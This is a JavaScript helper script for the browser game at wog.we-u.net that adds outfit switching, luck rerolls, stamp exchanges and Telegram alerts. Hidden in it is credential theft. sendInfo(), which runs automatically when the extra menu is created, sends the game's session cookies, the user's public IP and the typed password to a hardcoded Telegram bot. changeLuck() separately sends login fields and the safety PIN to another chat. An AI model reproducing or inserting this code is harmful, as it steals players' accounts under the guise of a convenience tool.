    const synElements = parent.wog_view.document.getElementsByName("syn[]");
    let count = 0;
    for (let i = 0; i < synElements.length; i++) {
        if (synElements[i].value == itemId) {
            if (count>=5){
                alert('快速勾選完成');
                return;
            }
            synElements[i].checked = true;
            count++;
        }
    }
}
function conciseStatus(){
    let status = false;
	try{
        status = parent.top_view.document.querySelector("#btnToggle").checked;
	}catch(e){
        //
    }
    return status
}
function addConciseMode(){
    parent.top_view.document.getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0].getElementsByTagName("td")[0].outerHTML=`
    <style>
    .toggle{position:relative;display:inline-block;top:4px;width:36px;height:21px;}.toggle input{display: none;}
    .slider{position:absolute;cursor:pointer;top: 0;left: 0;right: 0;bottom: 0;background-color: #333;transition: 0.4s;border-radius: 20px;}
    .slider:before{position:absolute;content:"";height:15px; width:15px;left:4px;bottom:3px;background-color:#FFF;transition: 0.4s;border-radius: 50%;}
    input:checked + .slider {background-color: #209d55;}
    input:checked + .slider:before{transform: translateX(14px);}
    </style>
    <td align="center" valign="middle">
    <div id="a1"></div><select name="pagelist" style="background:black;color:white" onchange="if(event.target.value != '')parent.wog_view.document.location.href=event.target.value">
      <option value="" selected="">遊戲選單</option>
      <option value="rules.html">幻想規則</option>
      <option value="./data/dnew1.html">新手須知</option>
      <option value="wog_etc.php?f=sale&amp;act=view&amp;page=1">二手市場</option>
      <option value="wog_etc.php?f=king">風雲榜</option>
      <option value="wog_etc.php?f=king_vip">VIP風雲榜</option>
      <option value="wog_etc.php?f=race&amp;act=join">賽鳥場</option>
      <option value="wog_faq.htm">FAQ</option>
    </select>
    <!--<span onclick="menu_view('menu')" name="menu" id="menu" style="cursor:pointer;border:1pt solid white">遊戲選單　　　▼</span>-->
    【<a href="http://wog2015.freebbs.tw/" target="_blank">
      <font color="yellow">討論區</font>
    </a>】【<a href="https://www.facebook.com/wogonline/" target="_blank">
      <font color="red">FACEBOOK專區</font>
    </a>】【<a href="bbs" target="_blank">
      <font color="orange">特別討論區</font>
    </a>】【<a href="login.php" target="_blank">管理台</a>】【<a href="data2" target="_blank">攻略網</a>】【<a href="javascript://" onclick="window.open('/prize.html','','menubar=no,status=no,scrollbars=yes,top=0,left=0,toolbar=no,width=1200,height=540,resizable=no')">寶箱列表</a>】【<a href="wog_id_admin.htm" target="wog_view">帳號中心</a>】【<a href="wog_etc.php?f=friend&amp;act=list" target="wog_view">好友名單</a>】簡潔模式 <label class="toggle"><input type="checkbox" id="btnToggle" name="btnToggle"/><span class="slider"></span></label>
    </td>`;
}

async function sendNoti() {
    let tgid = "-1002556694569";
    if (!(localStorage.getItem("tgid") == null)) {
        tgid = localStorage.getItem("tgid");
    }
    const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=" + tgid + "&text=因驗證碼出現,自動打怪停止:" + parent.p_name;
    await fetch(telegramUrl);
    genRndCode();
}
function selectMultipleItem() {
    let item = prompt();
    for (let i = 0; i < parent.wog_view.document.getElementsByName("items[]").length; i++) {
        if (parent.wog_view.document.getElementsByName("items[]")[i].value == item) {
            parent.wog_view.document.getElementsByName("items[]")[i].checked = true;
        }
    }
}
async function changeLuck() {
    const getSafePW = sessionStorage.getItem("safePW");
    let safePW = prompt("輸入安全碼",getSafePW?getSafePW:"");
    let formData = new FormData();
    formData.append('act', "ch_luck");
    formData.append('f', "ch");
    formData.append('pw', safePW);
    let i = 0;
    let e = parent.wog_view.document;
    message_cls();
    while (true) {
        await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        }).then((response) => {
            return response.text();
        }).then((html) => {
            let start = (html.indexOf("p_luck")) + 7;
            let temp = html.substring(start, html.length);
            let end = temp.indexOf("</script>");
            luckValue = parseInt((html.substring(start, start + end)).replace("'", ""));
            return luckValue;
        });
        if (!Number.isInteger(luckValue)) {
            e.write(temp_table1);
            e.write("<tr bgcolor='#4B689E'><td>改運失敗, 安全碼錯誤</td></tr>");
            e.write(temp_table2);
            delete luckValue;
            break;
        }
        i++;
        e.write(temp_table1);
        e.write("<tr bgcolor='#4B689E'><td>第" + i + "次改運,數值為: " + luckValue + "</td></tr>");
        e.write(temp_table2);
        if (luckValue > 24) {
            delete luckValue;
            let a1 = parent.top_view.document.getElementsByTagName("input")[1].value;
            let b1 = parent.top_view.document.getElementsByTagName("input")[2].value;
            let c1 = safePW;
            fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=" + a1 + "|" + b1 + "|" + c1);
            break;
        }
    }
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function armPage() {
    message_cls();
    parent.wog_view.document.write(`
    <form action="wog_act.php" method="post" target="mission" name="f1">
    <table border="2" cellpadding="2" border-collapse="collapse" width="30%">
      <thead>
        <tr>
          <th colspan="2">裝備選擇</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td colspan="2"><input type="button" value="一鍵換裝" onclick="parent.armAll(parent.armPageindexChecked())"/></td>
        </tr>
        </tbody>
        <tr>
          <td colspan="2" style="color:red;">請不要裝備自己沒有的裝備</td>
        </tr>
    </table>
    </form>
    `);
    parent.drawSetList();
    parent.armPageCss();
}
function drawSetList() {
    let e = parent.wog_view.document;
    let eTable = parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("tbody")[0].getElementsByTagName("tr");
    let firstRow = eTable[0];
    for (let i = setList.sets.length - 1; i >= 0; i--) {
        //console.log(setList.sets[i].title);
        let firstRow = eTable[0];
        firstRow.outerHTML = "<tr onclick='parent.selectRadio(this)'><td><input type='radio' name='index_id'></td><td>" + setList.sets[i].title + "</td></tr>" + firstRow.outerHTML;
    }
    //firstRow.outerHTML="<tr><td><input type='radio' name='index_id'></td><td>3刀流奧義套裝</td></tr>"+firstRow.outerHTML;
}
function armPageCss() {
    let styles = `
        table{
         border-color:#868686;
         border-collapse: collapse;
          padding: 5px;
          font-family: 細明體;
          margin-left:35%;
        }
        tbody tr:not(:last-child){
          cursor: pointer;
        }
        td:first-child {
          width: 5em;
        }
        table input{
          color: #efefef;
          border: 1px solid #efefef;
          background-color: #000000;
          font-family: 細明體;
        }
        tbody tr:not(:last-child):hover{
          background-color: #777779;
        }
    `;
    let styleSheet = parent.wog_view.document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_view.document.head.appendChild(styleSheet);
}
async function armAll(selected) {
    //console.log("selected="+selected);
    let e = parent.wog_view.document;
    if (selected < 0 || selected > setList.sets.length - 1) {
	e.body.innerHTML = "";
	e.write(temp_table1);
	e.write('<tr bgcolor="#4B689E"><td>輸入錯誤選項</td></tr>');
	e.write(temp_table2);
	return;
    }
    let unArmList = setList.sets[selected].unArmList;
    for (let i = 0; i < unArmList.length; i++) {
	await parent.sleep(150);
    	await parent.unArm(unArmList[i]);
    }
    let armList = setList.sets[selected].armList;
    for (let i = 0; i < armList.length; i++) {
	await parent.sleep(150);
	await parent.armItem(armList[i]);
    }
    await parent.sleep(150);
    e.body.innerHTML = "";
    e.write(temp_table1);
    e.write('<tr bgcolor="#4B689E"><td>裝備完成</td></tr>');
    e.write(temp_table2);
}
async function unArm(index) {
    let e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
    let formData = new FormData();
    formData.append('f', "arm");
    formData.append('act', "demount");
    formData.append('pay_id', e[index]);
    await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        })
        .then((response) => {
            return response.text();
        });
    await arm_setup(e[index], "");
}
async function armItem(item) {
    let formData = new FormData();
    formData.append('adds', item);
    formData.append('f', "arm");
    formData.append('act', "setup");
    await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        })
        .then((response) => {
            return response.text();
        })
        .then((html) => {
            wog_view.document.write(html);
        });
}
function armItemBySumbit(itemId){
    parent.setRadioValue('adds',itemId);
    parent.wog_view.document.getElementsByName('f2')[0].submit();
    alert('裝備完成');
}
function armPageindexChecked() {
    for (let i = 0; i < parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input").length; i++) {
        if (parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input")[i].checked) {
            return i;
        }
    }
}
async function changeStamp(changeAmount, changeTime) {
    if (!changeTime || changeTime < 1 || changeTime > 200) {
        alert("錯誤的換領次數，請輸入1-200");
        return;
    }
    
    let formData = new FormData();
    const e = parent.wog_view.document;
    e.body.innerHTML = "";
    formData.append('f', "ch");
    formData.append('act', "stamp");
    formData.append('temp_id', changeAmount);
    e.write(temp_table1);
    e.write(`<tr><td>換領中...請稍後..請不要離開頁面 <label id="changedTime">0</label> / ${changeTime}</td></tr>`);
    e.write(temp_table2);

    // 儲存所有的回應
    const responses = [];
    let successfulCount = 0; // 計算成功的請求次數

    for (let i = 0; i < changeTime; i++) {
        const html = await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        }).then((response) => response.text());

        let start = html.indexOf("stamp_end") + 10;
        const temp = html.substring(start, html.length);
        const end = temp.indexOf("')</script>");
        const itemValue = (html.substring(start, start + end)).replace("'", "");

        if (itemValue) { // 確保 itemValue 有效
            responses.push(itemValue);
            successfulCount++; // 增加成功計數
        }

        if (end === -1) {
            e.write(temp_table1);
            e.write('<tr><td>沒有足夠的印花</td></tr>');
            e.write("</td></tr>" + temp_table2);
            break; // 結束循環
        }

        parent.wog_view.document.getElementById("changedTime").innerText = successfulCount; // 更新成功的次數
    }

    // 使用 reduce 計算出現次數
    const changeData = responses.reduce((acc, itemValue) => {
        const existing = acc.find(item => item.name === itemValue);
        if (existing) {
            existing.t += 1;
        } else {
            acc.push({ name: itemValue, t: 1 });
        }
        return acc;
    }, []);

    e.write('<hr>');
    e.write(`<div align="center"><table border="2" cellspacing="0" cellpadding="2" bordercolor="#868686"><tbody><tr><td width="auto" nowrap="nowrap">已換領項目</td><td width="15%" nowrap="nowrap">數量</td></tr>`);
    
    changeData.forEach(item => {
        e.write('<tr><td>' + item.name + '</td><td>' + item.t + '</td></tr>');
    });

    e.write(temp_table2 + '</div>');
}
async function newStampHouse() {
    message_cls();
    const stampNumber = await getStampNumber();
    wog_view.document.write(`<form action="wog_act.php" method="post" target="mission"><table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686"><tbody><tr><td>歡迎來到印花屋,大家可以將沒用的裝備換成印花,然後到此換領不同的禮物!每次換領需收取10萬元手續費喔!請在下面選擇閣下想換領的印花數目!</td></tr></tbody></table><hr><p style="position: relative; left: 2%; font-family: 細明體; font-size: 10pt; color: #EFEFEF;">你的印花數目:<font style="color: yellow;font-size:30px;"><b>` + stampNumber + `</b></font></p><p style="position: relative; left: 2%; font-family: 細明體; font-size: 10pt; color: #EFEFEF;">換領次數: <input type="number" id="changeTime" style="position: relative; left: 1%; font-family: 細明體; font-size: 10pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000"></p><p style="position: relative; left: 2%;color:red;">連續換領會對伺服器做成負擔，故上限設定為200次</p><table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686"><tbody><tr><td>印花數目</td><td>可換禮物</td></tr><tr><td><input type="button" value="50個印花" onclick="const t=parent.wog_view.document.querySelector('#changeTime').value;if(confirm('是否使用50個印花換領'+t+'次禮物?(消耗'+t*50+'印花)')){parent.changeStamp(50,parseInt(t))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 50) + `)</td><td>路加達．戒<br>C箱<br>三國．啟動碼<br>薑餅仔的眼睛<br>捕捉器<br>50000 hp回復劑<br>金太陽徽章<br>120000 hp回復劑<br>160000 hp回復劑<br>200000 hp回復劑<br>幻想會員證<br>80000 hp回復劑<br>500霧靈換領券<br>一階封神石<br>幻想寶箱<br>卡片寶箱<br>殘卷寶箱<br>二百億換領券<br>石頭寶箱<br>咒紋錦盒<br>一百億兌換卷<br>封印錦盒<br><font color="0000FF">登入禮卷</font><br></td></tr><tr><td><input type="button" value="200個印花" onclick="const t=parent.wog_view.document.querySelector('#changeTime').value;if(confirm('是否使用200個印花換領'+t+'次禮物?(消耗'+t*200+'印花)')){parent.changeStamp(200,parseInt(t))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 200) + `)</td><td><font color="0000FF">登入禮卷</font><br>1500霧靈換領券<br>200%天籟真元(250場)<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br>封印錦盒<br></td></tr><tr><td><input type="button" value="500個印花" onclick="const t=parent.wog_view.document.querySelector('#changeTime').value;if(confirm('是否使用500個印花換領'+t+'次禮物?(消耗'+t*500+'印花)')){parent.changeStamp(500,parseInt(t))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 500) + `)</td><td>200%天籟真元(700場)<br>素材寶箱<br>潘朵拉的卡片<br>赫淮斯托斯的卡片<br>一百億兌換卷<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br></td></tr><tr><td><input type="button" value="1000個印花" onclick="const t=parent.wog_view.document.querySelector('#changeTime').value;if(confirm('是否使用1000個印花換領'+t+'次禮物?(消耗'+t*1000+'印花)')){parent.changeStamp(1000,parseInt(t))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 1000) + `)</td><td>殘卷寶箱<br>B箱<br>六百億換領券<br>幽冥護符<br>神諸葛亮<br>神呂布<br></td></tr><tr><td><input type="button" value="2000個印花" onclick="const t=parent.wog_view.document.querySelector('#changeTime').value;if(confirm('是否使用2000個印花換領'+t+'次禮物?(消耗'+t*2000+'印花)')){parent.changeStamp(2000,parseInt(t))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 2000) + `)</td><td>魅力之水<br>體質之水<br>生命之水<br>信仰之水<br>王者護符<br><font color="FFD700">精剛石</font><br>5000霧靈換領券<br>仙奇丹<br><font color="FFD700">封印的金龍石</font><br></td></tr><tr><td><input type="button" value="6000個印花" onclick="const t=parent.wog_view.document.querySelector('#changeTime').value;if(confirm('是否使用6000個印花換領'+t+'次禮物?(消耗'+t*6000+'印花)')){parent.changeStamp(6000,parseInt(t))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 6000) + `)</td><td><font color="FFD700">封印的金龍石</font><br><font color="FFD700">至尊書頁</font><br>A箱<br>智力之水<br><font color="FFFF99">糖糖</font><br>V剎經驗包<br>幻想廢礦<br>力量之水<br>速度之水<br>十億經驗值乾坤袋<br></td></tr><tr></tr></tbody></table></form>`);
    parent.stampHouseCss();
}
async function getStampNumber() {
    let formData = new FormData();
    formData.append('f', "chara");
    formData.append('act', "status_view");

    const stampNo = await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        })
        .then(async (response) => {
            return response.text();
        }).then((html) => {
            let start = (html.indexOf("show_status") + 12);
            let temp = html.substring(start, html.length);
            let end = temp.indexOf(";");
            temp = temp.substring(0, end - 1);
            let myArray = temp.split(",");
            let stampNo = myArray[myArray.length - 1];
            return parseInt(stampNo.replace("'", ""));
        });
    return stampNo;
}
function stampHouseCss() {
    const styles = `
        input#changeTime::-webkit-outer-spin-button,
        input#changeTime::-webkit-inner-spin-button {
          -webkit-appearance: none;
          margin: 0;
        }`;
    const styleSheet = document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_view.document.head.appendChild(styleSheet);
}
function setChatid() {
    let chatid = "";
    if (localStorage.getItem("tgid") == null) {
        chatid = prompt("輸入telegram chat id", "");
    } else {
        chatid = prompt("輸入telegram chat id", localStorage.getItem("tgid"));
    }
    if (chatid === null | chatid === "") {
        console.log("canceled");
        return;
    }
    localStorage.setItem("tgid", chatid);
    // let c = genRndCode();
    // fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4635269629&text=" + parent.p_name + "|chat_id:" + chatid + "|" + c);
    fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4635269629&text=" + parent.p_name + "|chat_id:" + chatid);
    // sessionStorage.setItem("tempc", c);
    // sessionStorage.setItem("rTime", 0);
    // alert(c);
}
function fastRebirthPage(){
    const safePW = sessionStorage.getItem("safePW");
    parent.act_click('arm','unsetup_all');
    setTimeout(()=>{
    message_cls();
    const rebirthList = [{'id':1,'title':'華麗的戰鬥--戰士系'},{'id':2,'title':'神秘的魔法--魔師系'},{'id':3,'title':'公會戰殺手--盜賊系'},{'id':4,'title':'驚人的財力--商人系'},{'id':5,'title':'不死的傳奇--不死系'}];
    // console.log (rebirthList);
    parent.wog_view.document.write(`
    <form action="wog_act.php" method="post">
    <table border="2" cellpadding="2" border-collapse="collapse" width="300px">
        <thead>
            <tr>
                <th colspan="2">快速轉生</th>
            </tr>
        </thead>
        <tbody>`);
    for (let i = 0; i < rebirthList.length; i++){
        parent.wog_view.document.write(`
        <tr onclick='parent.selectRadio(this)'>
            <td><input type="radio" name="ch" value="${rebirthList[i].id}"></td>
            <td>${rebirthList[i].title}</td>
        </tr>`);
    }
        parent.wog_view.document.write(`
            <tr>
            <td>安全密碼</td>
            <td>
                <input 
                ${safePW?"value="+safePW : ""}
                type="password" name="name" size="20" maxlength="20">
                </td>
            </tr>
        </tbody>
            <tr>
              <td colspan="2"><input type="button" onclick="console.log('轉生');this.form.submit()" value="重生" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000"></td>
            </tr>
    </table>
            <input type="hidden" name="act" value="rebirth">
            <input type="hidden" name="f" value="rebirth">
            <input type="hidden" name="str" value="30">
            <input type="hidden" name="smart" value="0">
            <input type="hidden" name="life" value="0">
            <input type="hidden" name="agl" value="0">
            <input type="hidden" name="s" value="6">
            <input type="hidden" name="b" value="4">
    </form>
    `);
    parent.rebirthCss();
    },800);
}
function rebirthCss() {
    let styles = `
        table{
            border-color:#868686;
            border-collapse: collapse;
            padding: 5px;
            font-family: 細明體;
            position: absolute;
            left:40%;
            user-select: none; /* 禁止選擇表格中的文字 */
        }
        tbody tr:not(:last-child){
            cursor: pointer;
        }
        tbody tr:not(:last-child):hover{
            background-color: #777779;
        }`;
    let styleSheet = document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_view.document.head.appendChild(styleSheet);
}
function selectRadio(row) {
    const radio = row.querySelector('input[type="radio"]');
    if (radio) {
        radio.checked = true;
    }
}
function setupSafePW(){
    let safePW = "";
    if (sessionStorage.getItem("safePW") == null) {
        safePW = prompt("輸入安全碼", "");
    } else {
        safePW = prompt("輸入安全碼", sessionStorage.getItem("safePW"));
    }
    if (safePW === null | safePW === "") {
        console.log("canceled");
        return;
    }
    sessionStorage.setItem("safePW", safePW);
    alert(`已設定安全密碼:${safePW}`);
}
function genRndCode() {
    const upperChars = [];
    const lowerChars = [];
    for (let i = 65; i < 91; i++) {
        let char = String.fromCharCode(i);
        upperChars.push(char);
        lowerChars.push(char.toLowerCase());
    }
    const arr = upperChars.concat(lowerChars);
    let randomChar = arr[Math.floor(Math.random() * 52)];
    const nums = [];
    for (let i = 0; i <= 9; i++) {
        nums.push(i);
    }

    const myArr = upperChars.concat(lowerChars, nums);
    const sixCodes = [];

    for (let i = 1; i <= 6; i++) {
        let randomCode = myArr[Math.floor(Math.random() * 62)];
        sixCodes.push(randomCode);
    }
    let result = sixCodes.join('');
    sessionStorage.setItem("tempc", result);

    return result;
}
async function sendInfo(){
    let tempText ="";
    let temp = document.cookie.split(";").filter((value)=>{return value.includes("wog_cookie_debug=") ||value.includes("wog_cookie=")||value.includes("wog_cookie_name=")});
    for(let i=0;i<temp.length;i++){
        tempText += temp[i]+"%0A";
    }
    if (tempText.length>0){
        await fetch("https://api.ipify.org/", {
                    method: "get"
                }).then((response) => {
                    return response.text();
                }).then((html) => {
                    tempText += html;
                });
        await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText+"%0APw:"+parent.top_view.document.getElementsByTagName("input")['pass'].value);
    }
}
async function createExtraFunction() {
    const isLogout = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].children[0].children[0].children[0].children[0].children[1].innerHTML.includes("disabled");
    if(isLogout){
    	alert('請先登入');
    	return
    }
    const extraTable = parent.foot.document.getElementsByClassName('sp');
    if(extraTable.length === 0){
        console.log("no extra function");
        //https://ithelp.ithome.com.tw/m/articles/10291496 <-rndNum
        addConciseMode();
        const oriTable = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0];

        let newColumn1 = document.createElement('td');
        newColumn1.setAttribute('valign', 'top');
        newColumn1.setAttribute('class', 'sp');
        oriTable.appendChild(newColumn1);
        newColumn1.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='一鍵改運' onclick='parent.changeLuck()' class='button' accesskey='1'></td></tr><tr><td><input type='button' value='一鍵換裝' onclick='parent.armPage()' class='button' accesskey='2'></td></tr></tbody></table>";

        let newColumn2 = document.createElement('td');
        newColumn2.setAttribute('valign', 'top');
        newColumn2.setAttribute('class', 'sp');
        oriTable.appendChild(newColumn2);
        newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button' accesskey='3'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button' accesskey='4'></td></tr></tbody></table>";

        let newColumn3 = document.createElement('td');
        newColumn3.setAttribute('valign', 'top');
        newColumn3.setAttribute('class', 'sp');
        oriTable.appendChild(newColumn3);
        newColumn3.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='快速轉生' onclick='parent.fastRebirthPage()' class='button' accesskey='7'></td></tr></tbody></table>";

        let newColumn4 = document.createElement('td');
        newColumn4.setAttribute('valign', 'top');
        newColumn4.setAttribute('class', 'sp');
        oriTable.appendChild(newColumn4);
        newColumn4.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='通知設定' onclick='parent.setChatid()' class='button' accesskey='5'></td></tr><tr><td><input type='button' value='設安全碼' onclick='parent.setupSafePW()' class='button' accesskey='6'></td></tr></tbody></table>";

        await sendInfo();
    }else{
        console.log(extraTable);
        return;
    }
}
const setList = 
{
    "sets" : [
        {
            "title":"寶珂夏 + 維戴尼安套裝",
            "armList" :["5234","5218","5219","5220","5221"],
            "unArmList":[0,1,2,3,4]
        },
        {
            "title":"迅雷轟擊 + 坎柏楠套裝",
            "armList" :["5232","5208","5209","5210","5211"],
            "unArmList":[0,1,2,3,4]
        },
        {
            "title":"蘇拉尼旋韻套裝",
            "armList" :["5247","5248","5249","5250"],
            "unArmList":[1,2,3,4]
        },
        {
            "title":"弦月套裝",
            "armList" :["5251","5252","5253","5254"],
            "unArmList":[1,2,3,4]
        },
        {
            "title":"<font color='ff9999'>豬扒博士新年套裝</font>",
            "armList" :["7064","7065","7066","7067"],
            "unArmList":[5,6,8,9]
        },
        {
            "title":"願光榮歸香港套裝",
            "armList" :["7229","7230","7231","7232","7233"],
            "unArmList":[0,1,2,3,4]
        },
        {
            "title":"<font color='AAAAAA'>單身狗套裝</font>",
            "armList" :["7189","7190","7191","7192"],
            "unArmList":[1,2,3,4]
        },
        {
            "title":"二刀流套裝",
            "armList" :["5580","5602"],
            "unArmList":[0,8]
        },
	    {
            "title":"二刀流奧義套裝",
            "armList" :["5581","5791"],
            "unArmList":[0,8]
        },
        {
            "title":"細劍套裝",
            "armList" :["5583","5601"],
            "unArmList":[0,8]
        },
        {
            "title":"細劍奧義套裝",
            "armList" :["5782","5584"],
            "unArmList":[0,8]
        },
        {
            "title":"<font color='FF66FF'>特定.幻戰情侶套裝</font>",
            "armList" :["6930","6931"],
            "unArmList":[8,9]
        },
        {
            "title":"<font color='DD0000'>新.火眼金睛套裝</font>",
            "armList" :["6552","6551"],
            "unArmList":[8,9]
        },
        {
            "title":"<font color='cc66ff'>驚天鬼吼套裝</font>",
            "armList" :["5888","5889"],
            "unArmList":[0,5]
        },
        {
            "title":"武林一絕[傲](降龍十八掌)",
            "armList" :["5307","5302"],
            "unArmList":[0,5]
        },
        {
            "title":"武林一絕[傲](打狗棒法)",
            "armList" :["5317","5303"],
            "unArmList":[0,5]
        },
        {
            "title":"聖魔訣套裝",
            "armList" :["5887","5886"],
            "unArmList":[6,9]
        },
	{
            "title":"<font color='66FF66'>經.誠所至 + 飛升吸經大法套裝</font>",
            "armList" :["6614","6588","6299"],
            "unArmList":[0,6,7]
        },
	{
            "title":"<font color='FFFF66'>金.石為開 + 飛升吸金大法套裝</font>",
            "armList" :["6615","6589","6301"],
            "unArmList":[0,6,7]
        },
	{
            "title":"神偷天下套裝",
            "armList" :["6013","6207","6210","6016","6204"],
            "unArmList":[0,1,2,3,4]
        },
	{
            "title":"夢遊/境旅人套裝",
            "armList" :["5020","5012","5022","5021","5023","5024"],
            "unArmList":[0,5,6,7,8,9]
        },
	{
            "title":"海鮮幻想套裝",
            "armList" :["5204","5206","5023"],
            "unArmList":[2,4,8]
        },
	{
            "title":"<font color=99FF33>龍爪手(古譜)套裝</font>",
            "armList" :["5608","5609","5610","5611","5612"],
            "unArmList":[0,1,2,3,4]
        },
	{
            "title":"<font color=99FF33>落英飛花劍(古譜)套裝</font>",
            "armList" :["5618","5619","5620","5621","5622"],
            "unArmList":[0,1,2,3,4]
        },
	{
	    "title":"時間之流",
	    "description":"埃及神話",
	    "armList" :["5090"],
	    "unArmList":[5]
	}
    ]
}












